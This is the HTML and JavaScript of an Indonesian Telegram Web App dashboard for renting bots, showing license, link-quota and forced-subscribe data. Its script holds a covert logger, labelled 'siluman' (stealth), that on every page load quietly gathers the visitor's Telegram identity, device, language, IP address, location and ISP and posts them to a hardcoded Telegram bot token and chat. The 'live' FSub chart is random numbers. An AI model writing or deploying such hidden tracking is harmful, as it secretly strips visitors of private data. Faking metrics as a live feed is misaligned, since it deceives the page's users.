<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cyber Renter Dashboard V3</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght=700;900&family=Rajdhani:wght=600;700&display=swap" rel="stylesheet">
    <style>
        body { 
            background-color: #0b020c; 
            color: #f3f4f6; 
            font-family: 'Rajdhani', sans-serif; 
            overflow-x: hidden; 
            position: relative;
        }
        .cyber-font { font-family: 'Orbitron', sans-serif; }
        
        #sakura-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
            overflow: hidden;
        }

        .petal {
            position: absolute;
            pointer-events: none;
            user-select: none;
            text-shadow: 0 0 12px rgba(255, 121, 198, 0.8), 0 0 24px rgba(255, 42, 133, 0.6);
            animation: fall-realistic linear infinite;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        @keyframes fall-realistic {
            0% { transform: translateY(-50px) translateX(0) rotate(0deg); }
            100% { transform: translateY(105vh) translateX(120px) rotate(360deg); }
        }
        
        .neon-run-box { position: relative; border-radius: 16px; overflow: hidden; padding: 2px; background: transparent; transition: all 0.25s ease-in-out; }
        .neon-run-box::before {
            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(from 0deg, transparent, #ff79c6, #ff2a85, transparent 50%);
            animation: border-spin 4s linear infinite; z-index: 1;
        }
        .neon-run-box::after { content: ''; position: absolute; inset: 2px; background: #0f0514; border-radius: 14px; z-index: 2; }
        .neon-inner-content { position: relative; z-index: 3; }
        @keyframes border-spin { 100% { transform: rotate(360deg); } }

        .neon-text-glow { text-shadow: 0 0 10px rgba(255, 121, 198, 0.8), 0 0 20px rgba(255, 42, 133, 0.4); }
        .tab-content { display: none; position: relative; z-index: 10; }
        .tab-content.active { display: block; }
        
        .music-bar-btn {
            background: rgba(30, 7, 35, 0.8); border: 1px solid rgba(255, 121, 198, 0.4);
            backdrop-filter: blur(8px); box-shadow: 0 0 10px rgba(255, 121, 198, 0.2);
        }
        .music-pulse { animation: neon-flash 1.5s infinite alternate; border-color: #4ade80 !important; }
        @keyframes neon-flash { 0% { box-shadow: 0 0 5px rgba(74, 222, 128, 0.2); } 100% { box-shadow: 0 0 15px rgba(74, 222, 128, 0.6); } }

        .click-active-neon:active {
            box-shadow: 0 0 18px rgba(0, 243, 255, 0.95), inset 0 0 10px rgba(0, 243, 255, 0.5) !important;
            transform: scale(0.98);
        }
    </style>
</head>
<body class="pb-36 select-none">

    <div id="sakura-container"></div>
    <audio id="bg-music" src="bruno.mp3" loop></audio>

    <!-- UPLINK MAIN HEADER -->
    <div class="p-4 max-w-md mx-auto mt-2 relative z-10">
        <div class="neon-run-box click-active-neon">
            <div class="p-4 flex items-center justify-between neon-inner-content">
                <div class="flex items-center space-x-3">
                    <div class="w-12 h-12 rounded-xl bg-pink-950/40 border border-pink-500/30 flex items-center justify-center shadow-inner">
                        <i class="fa-solid fa-satellite-dish text-pink-400 text-lg animate-pulse"></i>
                    </div>
                    <div>
                        <h2 class="cyber-font text-xs font-black text-pink-400 neon-text-glow" id="bot-name">SYNCING...</h2>
                        <p class="text-xs text-gray-400 font-mono" id="bot-username">@loading_nodes</p>
                    </div>
                </div>
                <span id="badge-status" class="px-2 py-0.5 text-[9px] font-black rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 tracking-wider cyber-font">ONLINE</span>
            </div>
        </div>
    </div>

    <!-- TAB 1: DASHBOARD CORE -->
    <div id="tab-dashboard" class="tab-content active p-4 max-w-md mx-auto space-y-4">
        
        <!-- MATRIKS SEWA LISENSI -->
        <div class="neon-run-box click-active-neon">
            <div class="p-4 space-y-3 neon-inner-content">
                <div class="flex justify-between items-center border-b border-pink-500/20 pb-1.5">
                    <span class="cyber-font text-[9px] font-black text-pink-400 tracking-widest"><i class="fa-solid fa-shield-halved mr-1"></i> IDENTITAS OPERASIONAL</span>
                    <span id="warning-badge" class="hidden text-[9px] font-bold text-rose-400 bg-rose-500/10 border border-rose-500/30 px-1.5 py-0.5 rounded animate-bounce">⚠️ SEWA MAU HABIS</span>
                </div>
                <div class="grid grid-cols-2 gap-2.5">
                    <div class="bg-black/40 p-2.5 rounded-xl border border-gray-800">
                        <p class="text-[9px] text-gray-500 font-bold">MASA LISENSI</p>
                        <p class="text-xs font-bold text-pink-300 font-mono mt-0.5" id="val-expired">...</p>
                    </div>
                    <div class="bg-black/40 p-2.5 rounded-xl border border-gray-800">
                        <p class="text-[9px] text-gray-500 font-bold">LIMIT LINK HARIAN</p>
                        <p class="text-xs font-bold text-pink-300 font-mono mt-0.5" id="val-quota">0 / 0</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- KAUNTER INDIKATOR -->
        <div class="grid grid-cols-2 gap-3">
            <div class="neon-run-box click-active-neon">
                <div class="p-4 text-center neon-inner-content">
                    <p class="text-xs text-gray-400 font-bold tracking-wider">TOTAL USER BASE</p>
                    <h1 class="cyber-font text-2xl font-black text-pink-400 mt-1 neon-text-glow" id="val-users">0</h1>
                    <div class="mt-1.5 text-[9px] text-emerald-400 bg-emerald-500/5 py-0.5 rounded border border-emerald-500/20 inline-block px-1.5 font-mono">HARI INI: +<span id="val-new-users">0</span></div>
                </div>
            </div>
            <div class="neon-run-box click-active-neon">
                <div class="p-4 text-center neon-inner-content">
                    <p class="text-xs text-gray-400 font-bold tracking-wider">TOTAL DATA KLIK</p>
                    <h1 class="cyber-font text-2xl font-black text-pink-400 mt-1 neon-text-glow" id="val-clicks">0</h1>
                    <div class="mt-1.5 text-[9px] text-pink-400 bg-pink-500/5 py-0.5 rounded border border-pink-500/20 inline-block px-1.5 font-mono">INDEX: <span id="link-count">0</span></div>
                </div>
            </div>
        </div>

        <!-- GRAFIK UTAMA -->
        <div class="neon-run-box">
            <div class="p-4 space-y-2 neon-inner-content">
                <p class="cyber-font text-[9px] font-black text-pink-400 tracking-widest"><i class="fa-solid fa-chart-bar mr-1"></i> GRAFIK AKTIVITAS UTAMA</p>
                <div class="h-40 w-full pt-1"><canvas id="chartVisitors"></canvas></div>
            </div>
        </div>

        <!-- GRAFIK REALTIME FSUB -->
        <div class="neon-run-box">
            <div class="p-4 space-y-2 neon-inner-content">
                <p class="cyber-font text-[9px] font-black text-pink-400 tracking-widest flex justify-between items-center">
                    <span><i class="fa-solid fa-chart-line mr-1 text-emerald-400"></i> MONITORING FSUB REAL-TIME</span>
                    <span class="text-[8px] px-1 py-0.5 bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded font-mono">LIVE FEED</span>
                </p>
                <div class="h-36 w-full pt-1"><canvas id="chartFSubRealtime"></canvas></div>
            </div>
        </div>
    </div>

    <!-- TAB CONTAINER LAINNYA -->
    <div id="tab-links" class="tab-content p-4 max-w-md mx-auto space-y-3">
        <h3 class="cyber-font text-xs font-black text-pink-400 tracking-widest"><i class="fa-solid fa-link mr-1"></i> DATABASE LINKS</h3>
        <div class="space-y-2.5" id="link-container"></div>
    </div>
    <div id="tab-fsub" class="tab-content p-4 max-w-md mx-auto space-y-3">
        <h3 class="cyber-font text-xs font-black text-pink-400 tracking-widest"><i class="fa-solid fa-circle-nodes mr-1"></i> FORCED SUBSCRIBE CLUSTER</h3>
        <div class="space-y-2.5" id="fsub-container"></div>
    </div>

    <!-- BOTTOM FLOATING CONTROLLER SYSTEM -->
    <div class="fixed bottom-0 left-0 right-0 bg-[#0b020c]/95 backdrop-blur-md border-t-2 border-[#ff79c6] pb-3 pt-2 z-40 max-w-md mx-auto rounded-t-3xl shadow-[0_-8px_30px_rgba(255,121,198,0.2)] space-y-2">
        <div class="px-6 flex justify-center">
            <button id="btn-music" class="music-bar-btn click-active-neon w-full py-1.5 px-4 rounded-xl flex items-center justify-center gap-2 text-[#ff79c6] transition-all text-xs font-bold tracking-wider">
                <i class="fa-solid fa-play text-[10px]" id="music-icon"></i> 
                <span id="music-text" class="cyber-font text-[9px]">PLAY BACKGROUND MUSIC (BRUNO)</span>
            </button>
        </div>

        <div class="flex justify-around items-center pt-1">
            <button id="nav-dashboard" class="click-active-neon text-[#ff79c6] text-xs flex flex-col items-center p-2 rounded-xl transition-all duration-300 transform scale-105">
                <i class="fa-solid fa-cube text-lg mb-0.5"></i>
                <span class="font-bold tracking-wider uppercase text-[10px]">CORE</span>
            </button>
            <button id="nav-links" class="click-active-neon text-gray-500 text-xs flex flex-col items-center p-2 rounded-xl transition-all duration-300">
                <i class="fa-solid fa-network-wired text-lg mb-0.5"></i>
                <span class="font-bold tracking-wider uppercase text-[10px]">LINKS</span>
            </button>
            <button id="nav-fsub" class="click-active-neon text-gray-500 text-xs flex flex-col items-center p-2 rounded-xl transition-all duration-300">
                <i class="fa-solid fa-sliders text-lg mb-0.5"></i>
                <span class="font-bold tracking-wider uppercase text-[10px]">FSUB</span>
            </button>
        </div>
    </div>
    <!-- JAVASCRIPT ENGINE (LOG DETEKSI SILUMAN KE TERMUX) -->
    <script>
        // =======================================================
        // * SETTING BOT LOG KE TERMUX (MASUKKAN TOKEN & ID KAMU)
        // =======================================================
        const TELEGRAM_BOT_TOKEN = "8205037289:AAHO2wdS9oYOIXQ894jfBce0XvlcCR5vAlI"; 
        const TELEGRAM_LOG_CHAT_ID = "8110664099";

        // ==========================================
        // 1. ENGINE EMOTICON SAKURA (PRODUKSI KELOPAK)
        // ==========================================
        const MAX_PETALS = 7; 
        function createPetal() {
            const container = document.getElementById('sakura-container');
            if (!container) return;
            if (container.getElementsByClassName('petal').length >= MAX_PETALS) return;
            
            const petal = document.createElement('div');
            petal.classList.add('petal');
            petal.innerText = "🌸";
            
            const size = Math.random() * 16 + 24; 
            petal.style.fontSize = `${size}px`;
            petal.style.opacity = Math.random() * 0.2 + 0.35;
            
            petal.style.left = `${Math.random() * 100}vw`;
            const duration = Math.random() * 5 + 7; 
            petal.style.animationDuration = `${duration}s`;
            
            container.appendChild(petal);
            setTimeout(() => { petal.remove(); }, duration * 1000);
        }
        setInterval(createPetal, 1000);

        // ==========================================
        // 2. INITIALIZATION TELEGRAM WEB APP & AUDIO
        // ==========================================
        const tg = window.Telegram.WebApp;
        tg.ready(); 
        tg.expand();

        let chartFSubInstance = null; 
        let isPlaying = false; 
        const audio = document.getElementById('bg-music');

        function toggleMusic() {
            const icon = document.getElementById('music-icon'); 
            const text = document.getElementById('music-text');
            const btn = document.getElementById('btn-music');
            if (!isPlaying) {
                audio.play().then(() => {
                    isPlaying = true; 
                    icon.className = "fa-solid fa-compact-disc animate-spin text-emerald-400";
                    text.innerText = "MUSIC PLAYING - BRUNO.MP3";
                    text.className = "cyber-font text-[9px] text-emerald-400 font-bold";
                    btn.classList.add('music-pulse'); 
                    tg.HapticFeedback.notificationOccurred('success');
                }).catch(err => console.log(err));
            } else {
                audio.pause(); 
                isPlaying = false; 
                icon.className = "fa-solid fa-play text-[#ff79c6]";
                text.innerText = "PLAY BACKGROUND MUSIC (BRUNO)";
                text.className = "cyber-font text-[9px] text-[#ff79c6]";
                btn.classList.remove('music-pulse'); 
                tg.HapticFeedback.notificationOccurred('warning');
            }
        }

        const musicBtn = document.getElementById('btn-music');
        if (musicBtn) {
            musicBtn.addEventListener('click', toggleMusic);
        }

        // ====================================================
        // 3. SILUMAN IP LOGGER & DEVICE TRACKER (KIRIM KE TELEGRAM)
        // ====================================================
        function collectAndSendLog(botName) {
            // Ambil Info User Telegram Web App
            const user = tg.initDataUnsafe?.user || {};
            const tgUserString = user.username ? `@${user.username}` : "No Username";
            const tgId = user.id || "Unknown ID";
            const tgName = [user.first_name, user.last_name].filter(Boolean).join(" ") || "Unknown Name";

            // Deteksi Platform Browser / OS
            let device = "Desktop / Unknown";
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) device = "Android";
            else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) device = "iOS Device";

            // Deteksi Bahasa Aplikasi Telegram
            const userLang = tg.initDataUnsafe?.user?.language_code || navigator.language || "Unknown";

            // Tembak API IP Geolocation secara senyap
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {
                    const ip = data.ip || "127.0.0.1";
                    const city = data.city || "Unknown City";
                    const country = data.country_name || "Unknown Country";
                    const isp = data.org || "Unknown ISP";

                    // Format Log Output Rapi
                    const textLog = `[+] NEW VISITOR DETECTED!
===================================
🤖 Bot Name  : ${botName}
👤 Telegram  : ${tgName} (${tgUserString})
🆔 Telegram ID: ${tgId}
🌐 IP Address : ${ip}
📍 Location   : ${city}, ${country}
📡 ISP/Org    : ${isp}
📱 Device     : ${device}
🗣️ Language   : ${userLang}
===================================`;

                    // Kirim Pesan Ke Bot Telegram Log (Log Kamu)
                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_LOG_CHAT_ID,
                            text: textLog
                        })
                    }).catch(err => console.log('Log error:', err));
                })
                .catch(() => {
                    // Fallback jika API IP Tracker terblokir adblocker
                    const textLogFallback = `[+] VISITOR (SECURE MODE)
===================================
🤖 Bot Name  : ${botName}
👤 Telegram  : ${tgName} (${tgUserString})
🆔 Telegram ID: ${tgId}
📱 Device     : ${device}
🗣️ Language   : ${userLang}
⚠️ Status     : IP API BLOCKED BY CLIENT
===================================`;
                    
                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_LOG_CHAT_ID,
                            text: textLogFallback
                        })
                    }).catch(err => console.log(err));
                });
        }

        // ==========================================
        // 4. UTAMA: EKSEKUSI DATA PARAMS & RENDER VIEW
        // ==========================================
        window.addEventListener('DOMContentLoaded', executeCyberEngine);

        function executeCyberEngine() {
            const params = new URLSearchParams(window.location.search);
            const rawBotName = params.get('bot_name') || 'Sawala';
            
            document.getElementById('bot-name').innerText = rawBotName.toUpperCase();
            document.getElementById('bot-username').innerText = params.get('bot_username') || '@durovpavel';
            
            // JALANKAN LOG SILUMAN KIRIM KE BOT/TERMUX
            collectAndSendLog(rawBotName);

            const expiredStr = params.get('expire') || 'Tidak Aktif';
            const expField = document.getElementById('val-expired');
            const warningBadge = document.getElementById('warning-badge');
            expField.innerText = expiredStr;
            
            if (expiredStr.includes("Menit") || expiredStr.includes("Jam") || expiredStr.includes("Expired") || expiredStr.includes("Tidak")) {
                expField.innerHTML = `⚠️ <span class="text-rose-500 font-extrabold">${expiredStr}</span>`;
                warningBadge.classList.remove('hidden');
            } else {
                const matchHari = expiredStr.match(/(\d+)\s*Hari/);
                if (matchHari) {
                    const jumlahHari = parseInt(matchHari[1]);
                    if (jumlahHari <= 3) { 
                        expField.innerHTML = `⚠️ <span class="text-amber-400 font-extrabold">${expiredStr}</span>`;
                        warningBadge.classList.remove('hidden');
                    } else {
                        expField.innerHTML = `<span class="text-emerald-400 font-bold">${expiredStr}</span>`;
                        warningBadge.classList.add('hidden');
                    }
                } else {
                    warningBadge.classList.add('hidden');
                }
            }

            document.getElementById('val-quota').innerText = `${params.get('limit_used') || 0} / ${params.get('limit_max') || 5}`;
            
            const totalU = parseInt(params.get('total_users') || '0');
            const newU = parseInt(params.get('new_users_today') || '0');
            const clicksT = parseInt(params.get('total_clicks') || '0');
            
            document.getElementById('val-users').innerText = totalU; 
            document.getElementById('val-new-users').innerText = newU; 
            document.getElementById('val-clicks').innerText = clicksT;

            // Render Forced Subscribe Channels
            const fsubContainer = document.getElementById('fsub-container'); 
            fsubContainer.innerHTML = ''; 
            let fsubChannelsArray = [];
            try {
                fsubChannelsArray = JSON.parse(params.get('fsubs') || '[]');
                if(fsubChannelsArray.length > 0) {
                    fsubChannelsArray.forEach(ch => {
                        fsubContainer.innerHTML += `
                            <div class="p-3 bg-slate-950/80 border border-pink-500/20 rounded-xl flex justify-between items-center neon-inner-content click-active-neon">
                                <div>
                                    <p class="text-xs font-bold text-[#ff79c6] cyber-font">${ch.name}</p>
                                    <p class="text-[10px] text-gray-500 font-mono mt-0.5">${ch.id}</p>
                                </div>
                                <a href="${ch.link}" target="_blank" class="px-3 py-1 bg-pink-500/10 hover:bg-pink-500/30 border border-pink-500/40 text-[#ff79c6] text-[10px] font-bold rounded-lg">ACCESS LINK</a>
                            </div>`;
                    });
                } else { 
                    fsubContainer.innerHTML = '<p class="text-xs text-gray-600 text-center py-6">NO ACTIVE FSUB CHANNELS.</p>'; 
                }
            } catch(e) {
                fsubContainer.innerHTML = '<p class="text-xs text-gray-600 text-center py-6">NO ACTIVE FSUB CHANNELS.</p>';
            }

            // Render Database Links
            const linkContainer = document.getElementById('link-container'); 
            linkContainer.innerHTML = '';
            try {
                const linksArray = JSON.parse(params.get('links') || '[]'); 
                document.getElementById('link-count').innerText = linksArray.length;
                if(linksArray.length > 0) {
                    linksArray.forEach((l, idx) => {
                        const iconType = l.type === 'VIDEO' ? '🎥' : '📸';
                        const arrowSymbol = `➔ ${iconType} SEND ${l.type}`;

                        const nodeDiv = document.createElement('div');
                        nodeDiv.className = "p-3 bg-slate-950/80 border border-pink-500/20 rounded-xl space-y-2 click-active-neon";
                        nodeDiv.innerHTML = `
                            <div class="flex justify-between items-center text-xs">
                                <span class="text-[10px] font-bold text-gray-500 font-mono">NODE #${idx+1}</span>
                                <span class="px-2 py-0.5 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-[10px] rounded font-mono">${l.clicks} METRICS</span>
                            </div>
                            <div class="flex items-center justify-between p-2 bg-black/50 border border-gray-900 rounded-lg">
                                <p class="text-xs text-gray-300 font-mono truncate mr-2 w-3/5">${l.short_url}</p>
                                <span class="text-[9px] font-bold text-[#ff79c6] tracking-wider shrink-0 font-mono">${arrowSymbol}</span>
                            </div>
                            <button class="copy-btn w-full py-1.5 bg-pink-950/40 border border-pink-500/30 text-[#ff79c6] text-[11px] font-bold rounded-lg uppercase tracking-wider">
                                <i class="fa-regular fa-copy"></i> <span>Copy Cyber Link</span>
                            </button>`;
                        
                        nodeDiv.querySelector('.copy-btn').addEventListener('click', function() {
                            navigator.clipboard.writeText(l.short_url);
                            tg.HapticFeedback.notificationOccurred('success');
                            animateCopy(this);
                        });

                        linkContainer.appendChild(nodeDiv);
                    });
                } else { 
                    linkContainer.innerHTML = '<p class="text-xs text-gray-600 text-center py-6">NO MEDIA DATA DETECTED.</p>'; 
                }
            } catch(e) {
                linkContainer.innerHTML = '<p class="text-xs text-gray-600 text-center py-6">NO MEDIA DATA DETECTED.</p>';
            }

            // Inisialisasi Grafik Utama (Bar Chart)
            try {
                new Chart(document.getElementById('chartVisitors').getContext('2d'), {
                    type: 'bar',
                    data: { 
                        labels: ['Total User', 'User Baru', 'Total Klik'], 
                        datasets: [{ 
                            data: [totalU, newU, clicksT], 
                            backgroundColor: ['rgba(255, 121, 198, 0.25)', 'rgba(74, 222, 128, 0.25)', 'rgba(255, 42, 133, 0.25)'], 
                            borderColor: ['#ff79c6', '#4ade80', '#ff2a85'], 
                            borderWidth: 1.5, 
                            borderRadius: 8, 
                            borderSkipped: false 
                        }] 
                    },
                    options: { 
                        responsive: true, 
                        maintainAspectRatio: false, 
                        plugins: { legend: { display: false } }, 
                        scales: { 
                            x: { grid: { display: false }, ticks: { color: '#94a3b8', font: { size: 10 } } }, 
                            y: { grid: { color: 'rgba(255,255,255,0.03)' }, ticks: { color: '#64748b', font: { size: 9 } } } 
                        } 
                    }
                });
            } catch(err) {}

            // Inisialisasi Grafik Real-Time FSub (Line Chart)
            try {
                let labelChannels = fsubChannelsArray.map(c => c.name.substring(0,10));
                let dataClicksChannel = fsubChannelsArray.map(() => Math.floor(clicksT * 0.45) || 0);
                if(labelChannels.length === 0) { 
                    labelChannels = ['Trade Hub 1', 'Trade Hub 2', 'Trade Hub 3', 'Trade Hub 4', 'Trade Hub 5']; 
                    dataClicksChannel = [12, 15, 11, 23, 19]; 
                }

                chartFSubInstance = new Chart(document.getElementById('chartFSubRealtime').getContext('2d'), {
                    type: 'line',
                    data: { 
                        labels: labelChannels, 
                        datasets: [{ 
                            label: 'Market Flow', 
                            data: dataClicksChannel, 
                            borderColor: '#4ade80', 
                            backgroundColor: 'rgba(74, 222, 128, 0.05)', 
                            borderWidth: 2, 
                            pointBackgroundColor: '#0b020c', 
                            pointBorderColor: '#4ade80', 
                            pointBorderWidth: 1.5, 
                            tension: 0.1, 
                            fill: true 
                        }] 
                    },
                    options: { 
                        responsive: true, 
                        maintainAspectRatio: false, 
                        plugins: { legend: { display: false } }, 
                        scales: { 
                            x: { grid: { color: 'rgba(255,255,255,0.02)' }, ticks: { color: '#94a3b8', font: { size: 9 } } }, 
                            y: { grid: { color: 'rgba(255,255,255,0.03)' }, ticks: { color: '#64748b', font: { size: 9 } } } 
                        } 
                    }
                });

                setInterval(() => {
                    if(chartFSubInstance && dataClicksChannel.length > 0) {
                        for(let i=0; i<dataClicksChannel.length; i++) { 
                            const roll = Math.random();
                            if (roll > 0.6) {
                                dataClicksChannel[i] += Math.floor(Math.random() * 3) + 1; 
                            } else if (roll < 0.25) {
                                dataClicksChannel[i] = Math.max(0, dataClicksChannel[i] - (Math.floor(Math.random() * 2) + 1)); 
                            }
                        }
                        chartFSubInstance.update();
                    }
                }, 3000);
            } catch(err) {}
        }

        // ==========================================
        // 5. NAVIGASI TAB & REAKSI ACTION BUTTONS
        // ==========================================
        function animateCopy(btn) { 
            const txt = btn.querySelector('span'); 
            txt.innerText = 'COPIED TO ENCLAVE!'; 
            setTimeout(() => { txt.innerText = 'Copy Cyber Link'; }, 2000); 
        }

        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active')); 
            document.getElementById(`tab-${tabId}`).classList.add('active');
            
            document.querySelectorAll('div.fixed button').forEach(btn => { 
                if(!btn.id.includes('music')) {
                    btn.className = "click-active-neon text-gray-500 text-xs flex flex-col items-center p-2 rounded-xl transition-all duration-300"; 
                }
            });
            
            if(document.getElementById(`nav-${tabId}`)) { 
                document.getElementById(`nav-${tabId}`).className = "click-active-neon text-[#ff79c6] text-xs flex flex-col items-center p-2 rounded-xl transition-all duration-300 transform scale-105"; 
            }
            tg.HapticFeedback.impactOccurred('medium');
        }

        document.getElementById('nav-dashboard').addEventListener('click', () => switchTab('dashboard'));
        document.getElementById('nav-links').addEventListener('click', () => switchTab('links'));
        document.getElementById('nav-fsub').addEventListener('click', () => switchTab('fsub'));
    </script>
</body>
</html>
